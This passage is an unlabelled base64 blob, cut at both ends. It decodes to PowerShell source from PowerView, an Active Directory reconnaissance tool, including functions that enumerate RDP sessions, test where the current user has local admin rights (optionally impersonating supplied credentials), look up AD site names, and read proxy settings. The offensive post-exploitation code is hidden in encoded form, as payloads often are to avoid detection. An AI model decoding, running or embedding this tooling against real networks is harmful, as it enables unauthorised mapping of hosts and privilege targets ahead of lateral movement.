zc2lvbl0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcjIpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldDIgPSAkcHBCdWZmZXIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyMiA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5mbzIgPSAkTmV3SW50UHRyMiAtYXMgJFdUU19DTElFTlRfQUREUkVTUwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9ICRJbmZvMi5BZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFNvdXJjZUlQWzJdIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNvdXJjZUlQID0gW1N0cmluZ10kU291cmNlSVBbMl0rJy4nK1tTdHJpbmddJFNvdXJjZUlQWzNdKycuJytbU3RyaW5nXSRTb3VyY2VJUFs0XSsnLicrW1N0cmluZ10kU291cmNlSVBbNV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlSVAnICRTb3VyY2VJUAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSBtZW1vcnkgYnVmZmVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeSgkcHBCdWZmZXIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSBtZW1vcnkgcmVzdWx0IGJ1ZmZlcgogICAgICAgICAgICAgICAgICAgICROdWxsID0gJFd0c2FwaTMyOjpXVFNGcmVlTWVtb3J5RXgoMiwgJHBwU2Vzc2lvbkluZm8sICRwQ291bnQpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldFJEUFNlc3Npb25dIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgIyBjbG9zZSBvZmYgdGhlIHNlcnZpY2UgaGFuZGxlCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTQ2xvc2VTZXJ2ZXIoJEhhbmRsZSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0UkRQU2Vzc2lvbl0gRXJyb3Igb3BlbmluZyB0aGUgUmVtb3RlIERlc2t0b3AgU2Vzc2lvbiBIb3N0IChSRCBTZXNzaW9uIEhvc3QpIHNlcnZlciBmb3I6ICRDb21wdXRlck5hbWUiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBUZXN0LUFkbWluQWNjZXNzIHsKPCMKLlNZTk9QU0lTCgpUZXN0cyBpZiB0aGUgY3VycmVudCB1c2VyIGhhcyBhZG1pbmlzdHJhdGl2ZSBhY2Nlc3MgdG8gdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZS4KCklkZWEgc3RvbGVuIGZyb20gdGhlIGxvY2FsX2FkbWluX3NlYXJjaF9lbnVtIHBvc3QgbW9kdWxlIGluIE1ldGFzcGxvaXQgd3JpdHRlbiBieTogIAogICAgJ0JyYW5kb24gTWNDYW5uICJ6ZWtub3giIDxibWNjYW5uW2F0XWFjY3V2YW50LmNvbT4nICAKICAgICdUaG9tYXMgTWNDYXJ0aHkgInNtaWxpbmdyYWNjb29uIiA8c21pbGluZ3JhY2Nvb25bYXRdZ21haWwuY29tPicgIAogICAgJ1JveWNlIERhdmlzICJyM2R5IiA8cmRhdmlzW2F0XWFjY3V2YW50LmNvbT4nICAKCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgdXNlIHRoZSBPcGVuU0NNYW5hZ2VyVyBXaW4zMkFQSSBjYWxsIHRvIGVzdGFibGlzaAphIGhhbmRsZSB0byB0aGUgcmVtb3RlIGhvc3QuIElmIHRoaXMgc3VjY2VlZHMsIHRoZSBjdXJyZW50IHVzZXIgY29udGV4dApoYXMgbG9jYWwgYWRtaW5pc3RyYXRvciBhY2VzcyB0byB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gY2hlY2sgZm9yIGxvY2FsIGFkbWluIGFjY2VzcyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtIHVzaW5nIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbi4KCi5FWEFNUExFCgpUZXN0LUFkbWluQWNjZXNzIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyCgpSZXR1cm5zIHJlc3VsdHMgaW5kaWNhdGluZyB3aGV0aGVyIHRoZSBjdXJyZW50IHVzZXIgaGFzIGFkbWluIGFjY2VzcyB0byB0aGUgJ3NxbHNlcnZlcicgaG9zdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29tcHV0ZXIgfCBUZXN0LUFkbWluQWNjZXNzCgpSZXR1cm5zIHdoYXQgbWFjaGluZXMgaW4gdGhlIGRvbWFpbiB0aGUgY3VycmVudCB1c2VyIGhhcyBhY2Nlc3MgdG8uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKVGVzdC1BZG1pbkFjY2VzcyAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlciAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5BZG1pbkFjY2VzcwoKQSBQU0N1c3RvbU9iamVjdCBjb250YWluaW5nIHRoZSBDb21wdXRlck5hbWUgYW5kICdJc0FkbWluJyBzZXQgdG8gd2hldGhlcgp0aGUgY3VycmVudCB1c2VyIGhhcyBsb2NhbCBhZG1pbiByaWdodHMsIGFsb25nIHdpdGggdGhlIENvbXB1dGVyTmFtZSBhZGRlZC4KCi5MSU5LCgpodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL2Jsb2IvbWFzdGVyL21vZHVsZXMvcG9zdC93aW5kb3dzL2dhdGhlci9sb2NhbF9hZG1pbl9zZWFyY2hfZW51bS5yYgpodHRwOi8vd3d3LnBvd2Vyc2hlbGxtYWdhemluZS5jb20vMjAxNC8wOS8yNS9lYXNpbHktZGVmaW5pbmctZW51bXMtc3RydWN0cy1hbmQtd2luMzItZnVuY3Rpb25zLWluLW1lbW9yeS8KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFkbWluQWNjZXNzJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICMgMHhGMDAzRiAtIFNDX01BTkFHRVJfQUxMX0FDQ0VTUwogICAgICAgICAgICAjICAgaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4NTk4MSh2PXZzLjg1KS5hc3B4CiAgICAgICAgICAgICRIYW5kbGUgPSAkQWR2YXBpMzI6Ok9wZW5TQ01hbmFnZXJXKCJcXCRDb21wdXRlciIsICdTZXJ2aWNlc0FjdGl2ZScsIDB4RjAwM0YpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICRJc0FkbWluID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAkSXNBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgoKICAgICAgICAgICAgIyBpZiB3ZSBnZXQgYSBub24temVybyBoYW5kbGUgYmFjaywgZXZlcnl0aGluZyB3YXMgc3VjY2Vzc2Z1bAogICAgICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICAgICAgJE51bGwgPSAkQWR2YXBpMzI6OkNsb3NlU2VydmljZUhhbmRsZSgkSGFuZGxlKQogICAgICAgICAgICAgICAgJElzQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNBZG1pbicgJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltUZXN0LUFkbWluQWNjZXNzXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICRJc0FkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzQWRtaW4nICRGYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgICRJc0FkbWluLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BZG1pbkFjY2VzcycpCiAgICAgICAgICAgICRJc0FkbWluCiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIEFEIHNpdGUgd2hlcmUgdGhlIGxvY2FsIChvciBhIHJlbW90ZSkgbWFjaGluZSByZXNpZGVzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQU1JlZmxlY3QsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCB1c2UgdGhlIERzR2V0U2l0ZU5hbWUgV2luMzJBUEkgY2FsbCB0byBsb29rIHVwIHRoZQpuYW1lIG9mIHRoZSBzaXRlIHdoZXJlIGEgc3BlY2lmaWVkIGNvbXB1dGVyIHJlc2lkZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBjaGVjayB0aGUgc2l0ZSBmb3IgKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byAnbG9jYWxob3N0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbSB1c2luZyBJbnZva2UtVXNlckltcGVyc29uYXRpb24uCgouRVhBTVBMRQoKR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMS50ZXN0bGFiLmxvY2FsCgpSZXR1cm5zIHRoZSBzaXRlIGZvciBXSU5ET1dTMS50ZXN0bGFiLmxvY2FsLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1OZXRDb21wdXRlclNpdGVOYW1lCgpSZXR1cm5zIHRoZSBzaXRlcyBmb3IgZXZlcnkgbWFjaGluZSBpbiBBRC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSAtQ29tcHV0ZXJOYW1lIFdJTkRPV1MxLnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuQ29tcHV0ZXJTaXRlCgpBIFBTQ3VzdG9tT2JqZWN0IGNvbnRhaW5pbmcgdGhlIENvbXB1dGVyTmFtZSwgSVBBZGRyZXNzLCBhbmQgYXNzb2NpYXRlZCBTaXRlIG5hbWUuCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlclNpdGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgIyBpZiB3ZSBnZXQgYW4gSVAgYWRkcmVzcywgdHJ5IHRvIHJlc29sdmUgdGhlIElQIHRvIGEgaG9zdG5hbWUKICAgICAgICAgICAgaWYgKCRDb21wdXRlciAtbWF0Y2ggJ14oPzpbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfSQnKSB7CiAgICAgICAgICAgICAgICAkSVBBZGRyZXNzID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QnlBZGRyZXNzKCRDb21wdXRlcikgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBIb3N0TmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJElQQWRkcmVzcyA9IEAoUmVzb2x2ZS1JUEFkZHJlc3MgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXIpWzBdLklQQWRkcmVzcwogICAgICAgICAgICB9CgogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCgogICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpEc0dldFNpdGVOYW1lKCRDb21wdXRlciwgW3JlZl0kUHRySW5mbykKCiAgICAgICAgICAgICRDb21wdXRlclNpdGUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJUEFkZHJlc3MnICRJUEFkZHJlc3MKCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAkU2l0ZW5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0F1dG8oJFB0ckluZm8pCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJTaXRlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NpdGVOYW1lJyAkU2l0ZW5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZV0gRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJFJlc3VsdCkuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJTaXRlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NpdGVOYW1lJyAnJwogICAgICAgICAgICB9CiAgICAgICAgICAgICRDb21wdXRlclNpdGUuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNvbXB1dGVyU2l0ZScpCgogICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCgogICAgICAgICAgICAkQ29tcHV0ZXJTaXRlCiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVdNSVJlZ1Byb3h5IHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBwcm94eSBzZXJ2ZXIgYW5kIFdQQUQgY29uZW50cyBmb3IgdGhlIGN1cnJlbnQgdXNlci4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KCkVudW1lcmF0ZXMgdGhlIHByb3h5IHNlcnZlciBhbmQgV1BBRCBzcGVjaWZpY2F0aW9uIGZvciB0aGUgY3VycmVudCB1c2VyCm9uIHRoZSBsb2NhbCBtYWNoaW5lIChkZWZhdWx0KSwgb3IgYSBtYWNoaW5lIHNwZWNpZmllZCB3aXRoIC1Db21wdXRlck5hbWUuCkl0IGRvZXMgdGhpcyBieSBlbnVtZXJhdGluZyBzZXR0aW5ncyBmcm9tCkhLVTpTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIHN5c3RlbSB0byBlbnVtZXJhdGUgcHJveHkgc2V0dGluZ3Mgb24uIERlZmF1bHRzIHRvIHRoZSBsb2NhbCBob3N0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW5nIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1XTUlSZWdQcm94eQoKQ29tcHV0ZXJOYW1lICAgICAgICAgICBQcm94eVNlcnZlciAgICAgICAgICAgIEF1dG9Db25maWdVUkwgICAgICAgICBXcGFkCi0tLS0tLS0tLS0tLSAgICAgICAgICAgLS0tLS0tLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLS0tICAgICAgICAgLS0tLQpXSU5ET1dTMSAgICAgICAgICAgICAgIGh0dHA6Ly9wcmltYXJ5LnRlc3QuLi4KCi5FWEFNUExFCgokQ3JlZCA9IEdldC1DcmVkZW50aWFsICJURVNUTEFCXGFkbWluaXN0cmF0b3IiCkdldC1XTUlSZWdQcm94eSAtQ3JlZGVudGlhbCAkQ3JlZCAtQ29tcHV0ZXJOYW1lIHByaW1hcnkudGVzdGxhYi5sb2NhbAoKQ29tcHV0ZXJOYW1lICAgICAgICAgICAgUHJveHlTZXJ2ZXIgICAgICAgICAgICBBdXRvQ29uZmlnVVJMICAgICAgICAgV3BhZAotLS0tLS0tLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLSAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tCndpbmRvd3MxLnRlc3RsYWIubG9jYWwgIHByaW1hcnkudGVzdGxhYi5sb2NhbAoKLklOUFVUUwoKU3RyaW5nCgpBY2NlcHRzIG9uZSBvciBtb3JlIGNvbXB1dGVyIG5hbWUgc3BlY2lmaWNhdGlvbiBzdHJpbmdzICBvbiB0aGUgcGlwZWxpbmUgKG5ldGJpb3Mgb3IgRlFETikuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlByb3h5U2V0dGluZ3MKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIHRoZSBDb21wdXRlck5hbWUsIFByb3h5U2VydmVyLCBBdXRvQ29uZmlnVVJMLCBhbmQgV1BBRCBjb250ZW50cy4KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlByb3h5U2V0dGluZ3MnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVudjpDT01QVVRFUk5BTUUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkV21pQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICAgICAnTmFtZXNwYWNlJyA9ICdyb290XGRlZmF1bHQnCiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgICAgICRSZWdQcm92aWRlciA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwogICAgICAgICAgICAgICAgJEtleSA9ICdTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycKCiAgICAgICAgICAgICAgICAjIEhLRVlfQ1VSUkVOVF9VU0VSCiAgICAgICAgICAgICAgICAkSEtDVSA9IDIxNDc0ODM2NDkKICAgICAgICAgICAgICAgICRQcm94eVNlcnZlciA9ICRSZWdQcm92aWRlci5HZXRTdHJpbmdWYWx1ZSgkSEtDVSwgJEtleSwgJ1Byb3h5U2VydmVyJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAkQXV0b0NvbmZpZ1VSTCA9ICRSZWdQcm92aWRlci5HZXRTdHJpbmdWYWx1ZSgkSEtDVSwgJEtleSwgJ0F1dG9Db25maWdVUkwnKS5zVmFsdWUKCiAgICAgICAgICAgICAgICAkV3BhZCA9ICcnCiAgICAgICAgICAgICAgICBpZiAoJEF1dG9Db25maWdVUkwgLWFuZCAoJEF1dG9Db25maWdVUkwgLW5lICcnKSkgew